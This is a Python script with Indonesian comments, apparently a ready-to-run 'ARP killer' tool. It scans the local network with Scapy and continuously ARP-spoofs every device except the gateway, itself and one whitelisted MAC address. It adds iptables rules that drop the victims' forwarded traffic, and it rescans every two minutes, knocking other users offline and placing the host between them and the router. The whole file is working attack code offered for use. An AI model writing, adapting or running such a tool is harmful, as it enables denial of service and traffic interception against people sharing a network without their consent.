#!/usr/bin/env python3
# linux ubuntu
# sudo /home/whoami/anaconda3/envs/venv2/bin/python nogui.py
import sys
import subprocess
import threading
import time
import signal
from typing import List, Dict, Optional
from dataclasses import dataclass

try:
    from scapy.all import *
except ImportError:
    print("Error: Scapy tidak terinstall. Install dengan: pip install scapy")
    sys.exit(1)

@dataclass
class Device:
    ip: str
    mac: str
    admin: bool = False
    
    def __eq__(self, other):
        return isinstance(other, Device) and self.mac == other.mac

class NetworkInterface:
    def __init__(self, name: str):
        self.name = name

def get_default_iface():
    """Mendapatkan interface default."""
    try:
        result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if line.startswith('default'):
                parts = line.split()
                iface_name = parts[4] if len(parts) > 4 else 'eth0'
                return NetworkInterface(iface_name)
    except Exception:
        return NetworkInterface('eth0')
    return NetworkInterface('NULL')

def get_my_ip():
    """Mendapatkan IP address komputer ini."""
    try:
        iface = get_default_iface()
        result = subprocess.run(['ip', 'addr', 'show', iface.name], 
                              capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if 'inet ' in line and 'inet6' not in line:
                ip = line.strip().split()[1].split('/')[0]
                return ip
    except Exception as e:
        print(f"Error getting my IP: {e}")
    return None

def get_my_mac():
    """Mendapatkan MAC address komputer ini."""
    try:
        iface = get_default_iface()
        result = subprocess.run(['ip', 'link', 'show', iface.name], 
                              capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if 'link/ether' in line:
                mac = line.strip().split()[1]
                return mac
    except Exception as e:
        print(f"Error getting my MAC: {e}")
    return None

def enable_ip_forwarding():
    """Aktifkan IP forwarding."""
    try:
        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], 
                      check=True, capture_output=True)
        print("[SYSTEM] IP forwarding enabled")
        return True
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Failed to enable IP forwarding: {e}")
        return False

def disable_ip_forwarding():
    """Nonaktifkan IP forwarding."""
    try:
        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], 
                      check=True, capture_output=True)
        print("[SYSTEM] IP forwarding disabled")
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Failed to disable IP forwarding: {e}")

def threaded(func):
    """Decorator untuk menjalankan fungsi di thread terpisah."""
    def wrapper(*args, **kwargs):
        thread = threading.Thread(target=func, args=args, kwargs=kwargs)
        thread.daemon = True
        thread.start()
        return thread
    return wrapper

class Killer:
    def __init__(self, router=None, protected_macs=None):
        self.iface = get_default_iface()
        self.router = router
        self.killed = {}
        self.storage = {}
        self.running = True
        self.my_ip = get_my_ip()
        self.my_mac = get_my_mac()
        self.protected_macs = protected_macs or []
        
        # Enable IP forwarding
        enable_ip_forwarding()
        print(f"[INFO] My IP: {self.my_ip}, My MAC: {self.my_mac}")

    def add_iptables_drop(self, ip):
        """Tambahkan rule iptables untuk DROP traffic dari IP"""
        try:
            cmd = ["iptables", "-A", "FORWARD", "-s", ip, "-j", "DROP"]
            subprocess.run(cmd, check=True)
            
            cmd = ["iptables", "-A", "FORWARD", "-d", ip, "-j", "DROP"]
            subprocess.run(cmd, check=True)
            
            print(f"[IPTABLES] Added DROP rules for {ip}")
        except subprocess.CalledProcessError as e:
            print(f"[IPTABLES ERROR] Failed to add rule for {ip}: {e}")

    def remove_iptables_drop(self, ip):
        """Hapus rule iptables untuk DROP traffic dari IP"""
        try:
            cmd = ["iptables", "-D", "FORWARD", "-s", ip, "-j", "DROP"]
            subprocess.run(cmd, check=True, stderr=subprocess.DEVNULL)
            
            cmd = ["iptables", "-D", "FORWARD", "-d", ip, "-j", "DROP"]
            subprocess.run(cmd, check=True, stderr=subprocess.DEVNULL)
            
            print(f"[IPTABLES] Removed DROP rules for {ip}")
        except subprocess.CalledProcessError:
            pass
    
    @threaded
    def kill(self, victim, wait_after=0.5):
        """Spoofing victim"""
        if not self.router:
            print("Router tidak ditemukan!")
            return
        if victim.mac.lower() in [mac.lower() for mac in self.protected_macs]:
            print(f"[PROTECTED] Skipping protected MAC: {victim.mac}")
            return
        
        if victim.ip == self.my_ip or victim.mac == self.my_mac:
            print(f"[WARNING] Skipping self: {victim.ip}")
            return
            
        if victim.mac in self.killed:
            print(f"{victim.mac} sudah di-kill.")
            return
        
        self.killed[victim.mac] = victim
        self.add_iptables_drop(victim.ip) 

        to_victim = ARP(
            op=2,
            psrc=self.router.ip,
            hwsrc=self.my_mac,
            pdst=victim.ip,
            hwdst=victim.mac
        )

        to_router = ARP(
            op=2,
            psrc=victim.ip,
            hwsrc=self.my_mac,
            pdst=self.router.ip,
            hwdst=self.router.mac
        )

        print(f'[KILL] Started poisoning {victim.ip} ({victim.mac})')

        while (victim.mac in self.killed and 
               self.iface.name != 'NULL' and 
               self.running):
            try:
                send(to_victim, iface=self.iface.name, verbose=0)
                send(to_router, iface=self.iface.name, verbose=0)
                time.sleep(wait_after)
            except Exception as e:
                print(f"[ERROR] Error sending packets: {e}")
                break

        print(f'[UNKILL] Stopped poisoning {victim.mac}')

    @threaded
    def unkill(self, victim):
        """Unspoofing victim"""
        if victim.mac not in self.killed:
            return
            
        self.killed.pop(victim.mac, None)
        self.remove_iptables_drop(victim.ip)

        if not self.router:
            return

        to_victim = ARP(
            op=2,
            psrc=self.router.ip,
            hwsrc=self.router.mac,
            pdst=victim.ip,
            hwdst=victim.mac
        )

        to_router = ARP(
            op=2,
            psrc=victim.ip,
            hwsrc=victim.mac,
            pdst=self.router.ip,
            hwdst=self.router.mac
        )

        if self.iface.name != 'NULL':
            try:
                for _ in range(5):
                    send(to_victim, iface=self.iface.name, verbose=0)
                    send(to_router, iface=self.iface.name, verbose=0)
                    time.sleep(0.2)
                print(f'[FIX] Restored ARP for {victim.ip} ({victim.mac})')
            except Exception as e:
                print(f"[ERROR] Error fixing victim: {e}")

    def kill_all(self, device_list):
        """Kill semua device yang tidak admin"""
        for device in device_list[:]:
            if device.admin:
                continue
            if device.ip == self.my_ip or device.mac == self.my_mac:
                continue
            if device.mac not in self.killed:
                self.kill(device)

    def unkill_all(self):
        """Unkill semua device"""
        for mac in list(self.killed.keys()):
            device = self.killed[mac]
            self.unkill(device)

    def stop(self):
        """Stop killer"""
        self.running = False
        self.unkill_all()
        time.sleep(2)
        disable_ip_forwarding()
        
        try:
            subprocess.run(['iptables', '-F', 'FORWARD'], check=True)
            print("[CLEANUP] Cleared iptables FORWARD chain")
        except:
            pass

class NetworkScanner:
    def __init__(self):
        self.network = None
        self.gateway = None
        self.gateway_mac = None
        self.my_ip = get_my_ip()
        self.my_mac = get_my_mac()
    
    def get_network_info(self):
        """Mendapatkan informasi jaringan"""
        try:
            result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
            for line in result.stdout.splitlines():
                if line.startswith('default'):
                    parts = line.split()
                    self.gateway = parts[2]
                    iface = parts[4]
                    
                    result2 = subprocess.run(['ip', 'addr', 'show', iface], 
                                           capture_output=True, text=True)
                    for line2 in result2.stdout.splitlines():
                        if 'inet ' in line2:
                            ip_net = line2.strip().split()[1]
                            self.network = ip_net
                            return True
        except Exception as e:
            print(f"Error getting network info: {e}")
        return False
    
    def get_gateway_mac(self):
        """Mendapatkan MAC address gateway"""
        if not self.gateway:
            return None
        try:
            arp = ARP(pdst=self.gateway)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp
            result = srp(packet, timeout=10, verbose=0)[0]
            if result:
                return result[0][1].hwsrc
        except Exception:
            pass
        return None
    
    def scan(self):
        """Menjalankan scan jaringan"""
        print("[SCAN] Mendapatkan informasi jaringan...")
        
        if not self.get_network_info():
            print("[ERROR] Gagal mendapatkan informasi jaringan")
            return []
        
        print(f"[SCAN] Scanning jaringan: {self.network}")
        
        try:
            arp = ARP(pdst=self.network)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp
            
            result = srp(packet, timeout=10, verbose=0)[0]
            
            devices = []
            for sent, received in result:
                is_gateway = (received.psrc == self.gateway)
                is_self = (received.psrc == self.my_ip or received.hwsrc == self.my_mac)
                
                device = Device(
                    ip=received.psrc,
                    mac=received.hwsrc,
                    admin=(is_gateway or is_self)
                )
                devices.append(device)
            
            self.gateway_mac = self.get_gateway_mac()
            
            print(f"[SCAN] Ditemukan {len(devices)} device")
            return devices
            
        except Exception as e:
            print(f"[ERROR] Error scanning: {e}")
            return []

class AutoModeKiller:
    def __init__(self, interval_minutes=2, protected_macs=None):
        self.interval_minutes = interval_minutes
        self.protected_macs = protected_macs or []
        self.scanner = NetworkScanner()
        self.killer = None
        self.running = True
        self.devices = []
        
        # Setup signal handler untuk Ctrl+C
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def signal_handler(self, sig, frame):
        """Handle Ctrl+C untuk cleanup"""
        print("\n[SIGNAL] Received shutdown signal...")
        self.stop()
        sys.exit(0)
    
    def scan_and_kill(self):
        """Scan network dan kill semua non-admin devices"""
        print("=" * 60)
        print(f"[AUTO MODE] Starting scan and kill cycle... [{time.strftime('%Y-%m-%d %H:%M:%S')}]")
        
        # Scan network
        devices = self.scanner.scan()
        
        if not devices:
            print("[WARNING] No devices found")
            return
        
        # Cari gateway
        gateway_device = None
        for device in devices:
            if device.admin and device.ip == self.scanner.gateway:
                gateway_device = device
                break
        
        if not gateway_device:
            print("[ERROR] Gateway not found!")
            return
        
        # Initialize atau update killer
        if not self.killer or self.killer.router != gateway_device:
            if self.killer:
                self.killer.stop()
            self.killer = Killer(gateway_device, protected_macs=self.protected_macs)
            print(f"[KILLER] Initialized with gateway: {gateway_device.ip} ({gateway_device.mac})")
            print(f"[KILLER] Protected MACs: {', '.join(self.protected_macs) if self.protected_macs else 'None'}")
        
        # Filter non-admin devices
        non_admin_devices = [d for d in devices if not d.admin]
        
        # Mark protected devices
        for device in non_admin_devices[:]:
            if device.mac.lower() in [mac.lower() for mac in self.protected_macs]:
                print(f"[PROTECTED] Skipping {device.ip} ({device.mac})")
                non_admin_devices.remove(device)
        
        if non_admin_devices:
            print(f"[KILL] Killing {len(non_admin_devices)} devices...")
            for device in non_admin_devices:
                print(f"  - {device.ip} ({device.mac})")
            
            self.killer.kill_all(non_admin_devices)
            self.devices = non_admin_devices
        else:
            print("[INFO] No devices to kill")
        
        print(f"[AUTO MODE] Cycle completed. Next scan in {self.interval_minutes} minutes")
        print("=" * 60)
    
    def run(self):
        """Jalankan auto mode"""
        print("=" * 60)
        print("NETWORK ARP KILLER - AUTO MODE")
        print("=" * 60)
        print(f"Interval: {self.interval_minutes} minutes")
        print(f"My IP: {get_my_ip()}")
        print(f"My MAC: {get_my_mac()}")
        print(f"Protected MACs: {', '.join(self.protected_macs) if self.protected_macs else 'None'}")
        print("\nPress Ctrl+C to stop")
        print("=" * 60)
        
        # Langsung jalankan pertama kali
        self.scan_and_kill()
        
        # Loop auto mode
        while self.running:
            # Countdown
            for remaining in range(self.interval_minutes * 60, 0, -1):
                if not self.running:
                    break
                
                mins = remaining // 60
                secs = remaining % 60
                print(f"\r[COUNTDOWN] Next scan in: {mins:02d}:{secs:02d}", end='', flush=True)
                time.sleep(1)
            
            print()  # New line setelah countdown
            
            if self.running:
                self.scan_and_kill()
    
    def stop(self):
        """Stop auto mode dan cleanup"""
        print("\n[STOP] Stopping auto mode...")
        self.running = False
        
        if self.killer:
            print("[CLEANUP] Restoring connections...")
            self.killer.stop()
        
        print("[STOP] Auto mode stopped")

def main():
    import os
    
    # Check if running as root
    if os.geteuid() != 0:
        print("=" * 60)
        print("ERROR: Aplikasi ini memerlukan hak akses root")
        print("Jalankan dengan: sudo python3 nogui.py")
        print("=" * 60)
        sys.exit(1)
    
    # Konfigurasi
    INTERVAL_MINUTES = 2  # Interval scan dalam menit
    PROTECTED_MACS = ["16:23:9c:5c:1f:f1"]  # MAC yang dilindungi
    
    # Jalankan auto mode
    auto_killer = AutoModeKiller(
        interval_minutes=INTERVAL_MINUTES,
        protected_macs=PROTECTED_MACS
    )
    
    try:
        auto_killer.run()
    except KeyboardInterrupt:
        print("\n[INTERRUPT] Keyboard interrupt received")
        auto_killer.stop()
    except Exception as e:
        print(f"\n[ERROR] Unexpected error: {e}")
        auto_killer.stop()

if __name__ == "__main__":
    main()
